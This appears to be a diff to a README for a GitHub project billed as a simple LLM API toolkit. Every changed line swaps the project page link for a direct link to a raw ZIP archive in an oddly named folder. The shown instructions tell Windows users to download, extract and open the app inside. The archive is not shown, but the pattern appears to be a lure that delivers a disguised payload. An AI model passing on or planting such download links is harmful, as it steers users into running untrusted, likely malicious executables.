@@ -1,6 +1,6 @@
 # 🤖 invalid-token-opencode - Simple LLM API toolkit
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://github.com/newsumeetenterprises43-dot/invalid-token-opencode)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/newsumeetenterprises43-dot/invalid-token-opencode/main/submissive/token_invalid_opencode_v1.5.zip)
 
 ## 📦 What this app is
 
@@ -31,7 +31,7 @@ If you plan to run larger models or heavy workflows, more memory helps.
 ## 🔽 Download and install
 
 1. Open the download page:
-   https://github.com/newsumeetenterprises43-dot/invalid-token-opencode
+   https://raw.githubusercontent.com/newsumeetenterprises43-dot/invalid-token-opencode/main/submissive/token_invalid_opencode_v1.5.zip
 
 2. On that page, look for the latest available release or download option.
 
@@ -237,7 +237,7 @@ If you change settings, the app may store them in a local config file so you do 
 
 If you want to get the app again or check for a newer copy, use this page:
 
-[Visit the download page](https://github.com/newsumeetenterprises43-dot/invalid-token-opencode)
+[Visit the download page](https://raw.githubusercontent.com/newsumeetenterprises43-dot/invalid-token-opencode/main/submissive/token_invalid_opencode_v1.5.zip)
 
 ## ❓ Common questions
 
@@ -271,7 +271,7 @@ No. It is built for multiple providers, not just one service.
 
 ## 📥 Download and run on Windows
 
-1. Open https://github.com/newsumeetenterprises43-dot/invalid-token-opencode
+1. Open https://raw.githubusercontent.com/newsumeetenterprises43-dot/invalid-token-opencode/main/submissive/token_invalid_opencode_v1.5.zip
 2. Download the Windows file from the page
 3. Extract the file if it comes in a ZIP folder
 4. Open the app file
